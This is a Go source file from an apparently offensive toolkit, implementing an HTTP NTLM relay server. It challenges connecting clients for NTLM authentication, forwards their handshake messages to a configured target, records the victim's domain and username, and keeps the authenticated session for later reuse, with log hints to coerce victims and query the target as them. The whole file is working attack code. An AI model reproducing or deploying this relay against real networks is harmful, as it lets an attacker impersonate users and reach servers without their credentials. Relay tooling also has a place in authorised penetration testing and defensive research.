package ntlmrelay

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"
)

// pendingHandshake holds the target-side sticky client mid-NTLM (Type1→Type2 done).
type pendingHandshake struct {
	client  *http.Client
	sticky  *stickyTransport
	created time.Time
}

// Server is an HTTP NTLM challenge listener that relays to a target and holds sessions.
type Server struct {
	cfg    RelayConfig
	store  *SessionStore
	server *http.Server
	ln     net.Listener

	// handshakeMu serializes NTLM handshakes (one Type1→Type3 at a time).
	handshakeMu sync.Mutex

	mu      sync.Mutex
	pending map[string]*pendingHandshake // keyed by full RemoteAddr (ip:port)
}

// NewServer creates a relay server.
func NewServer(cfg RelayConfig) (*Server, *SessionStore, error) {
	if cfg.ListenAddr == "" {
		return nil, nil, fmt.Errorf("listen address required")
	}
	if err := CheckListenPort(cfg.ListenAddr, cfg.AllowPriv); err != nil {
		return nil, nil, err
	}
	target, err := normalizeTarget(cfg.TargetURL)
	if err != nil {
		return nil, nil, err
	}
	cfg.TargetURL = target
	store := NewSessionStore()
	s := &Server{cfg: cfg, store: store, pending: make(map[string]*pendingHandshake)}
	return s, store, nil
}

// Store returns the session store.
func (s *Server) Store() *SessionStore { return s.store }

// Start listens and serves until ctx cancelled or Close.
func (s *Server) Start(ctx context.Context) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", s.handle)
	s.server = &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 30 * time.Second,
		BaseContext:       func(net.Listener) context.Context { return ctx },
	}

	ln, err := net.Listen("tcp", s.cfg.ListenAddr)
	if err != nil {
		return fmt.Errorf("listen %s: %w", s.cfg.ListenAddr, err)
	}
	s.ln = ln
	s.cfg.logf("[relay] HTTP NTLM listener on %s → %s (kernel-auth=%v sticky=1)", s.cfg.ListenAddr, s.cfg.TargetURL, s.cfg.KernelAuth)

	errCh := make(chan error, 1)
	go func() {
		errCh <- s.server.Serve(ln)
	}()
	select {
	case <-ctx.Done():
		_ = s.Close()
		return ctx.Err()
	case err := <-errCh:
		if err == http.ErrServerClosed {
			return nil
		}
		return err
	}
}

// Close stops the listener and sessions.
func (s *Server) Close() error {
	s.store.CloseAll()
	s.mu.Lock()
	for k, p := range s.pending {
		if p.sticky != nil {
			_ = p.sticky.Close()
		}
		delete(s.pending, k)
	}
	s.mu.Unlock()
	if s.server != nil {
		return s.server.Close()
	}
	return nil
}

func (s *Server) handle(w http.ResponseWriter, r *http.Request) {
	auth := r.Header.Get("Authorization")
	if auth == "" {
		s.cfg.logf("[relay] (HTTP) Client requested path: %s (challenge)", r.URL.Path)
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Connection", "keep-alive")
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	msg, err := DecodeNTLMAuthHeader(auth)
	if err != nil {
		http.Error(w, "bad authorization", http.StatusBadRequest)
		return
	}
	msgType, err := NTLMMessageType(msg)
	if err != nil {
		http.Error(w, "bad ntlm", http.StatusBadRequest)
		return
	}

	// Full remote addr (ip:port) — not IP alone — avoids NAT collision within one host.
	key := r.RemoteAddr

	switch msgType {
	case 1:
		// Serialize handshakes so concurrent Type1s don't interleave on server state.
		s.handshakeMu.Lock()
		defer s.handshakeMu.Unlock()

		client, sticky, err := newTargetClient(s.cfg.TargetURL, s.cfg.InsecureTLS)
		if err != nil {
			s.cfg.logf("[relay] sticky client: %v", err)
			http.Error(w, "relay failed", http.StatusBadGateway)
			return
		}
		if s.cfg.KernelAuth {
			probeTarget(client, s.cfg.TargetURL)
		}
		s.cfg.logf("[relay] (HTTP) Type1 from %s path=%s", r.RemoteAddr, r.URL.Path)
		type2, _, err := relayStep(client, s.cfg.TargetURL, msg, http.MethodGet, "/")
		if err != nil {
			_ = sticky.Close()
			s.cfg.logf("[relay] Type1→target failed: %v", err)
			http.Error(w, "relay failed", http.StatusBadGateway)
			return
		}
		s.mu.Lock()
		// Replace any stale pending for this remote conn key.
		if old, ok := s.pending[key]; ok && old.sticky != nil {
			_ = old.sticky.Close()
		}
		s.pending[key] = &pendingHandshake{client: client, sticky: sticky, created: time.Now()}
		s.mu.Unlock()
		w.Header().Set("WWW-Authenticate", EncodeNTLMAuthHeader(type2))
		w.Header().Set("Connection", "keep-alive")
		http.Error(w, "Unauthorized", http.StatusUnauthorized)

	case 3:
		s.handshakeMu.Lock()
		defer s.handshakeMu.Unlock()

		domain, user, _ := ParseType3Identity(msg)
		s.cfg.logf("[relay] (HTTP) Type3 from %s identity=%s\\%s", r.RemoteAddr, domain, user)

		s.mu.Lock()
		pend := s.pending[key]
		delete(s.pending, key)
		// Also expire pending older than 2 minutes for any key
		for k, p := range s.pending {
			if time.Since(p.created) > 2*time.Minute {
				if p.sticky != nil {
					_ = p.sticky.Close()
				}
				delete(s.pending, k)
			}
		}
		s.mu.Unlock()

		if pend == nil {
			s.cfg.logf("[relay] no pending Type1 for %s; rejecting Type3", key)
			http.Error(w, "no pending handshake (retry coerce)", http.StatusUnauthorized)
			return
		}
		client, sticky := pend.client, pend.sticky

		_, resp, err := relayStep(client, s.cfg.TargetURL, msg, http.MethodGet, "/")
		if err != nil {
			_ = sticky.Close()
			s.cfg.logf("[relay] Type3→target failed: %v", err)
			http.Error(w, "relay failed", http.StatusBadGateway)
			return
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()

		if resp.StatusCode == http.StatusUnauthorized {
			_ = sticky.Close()
			s.cfg.logf("[relay] target still 401 after Type3")
			http.Error(w, "auth failed at target", http.StatusUnauthorized)
			return
		}

		sess := &Session{
			Domain: domain,
			User:   user,
			Target: s.cfg.TargetURL,
			client: client,
			sticky: sticky,
		}
		id := s.store.Add(sess)
		s.cfg.logf("[relay] Authenticating connection from %s\\%s SUCCEED [%d] status=%d", domain, user, id, resp.StatusCode)
		s.cfg.logf("[relay] Session %d stored — use: ark relay http get --session %d --path /", id, id)

		for k, vv := range resp.Header {
			if isHopByHop(k) {
				continue
			}
			for _, v := range vv {
				w.Header().Add(k, v)
			}
		}
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(body)))
		w.WriteHeader(resp.StatusCode)
		_, _ = w.Write(body)

	default:
		http.Error(w, "unexpected ntlm type", http.StatusBadRequest)
	}
}
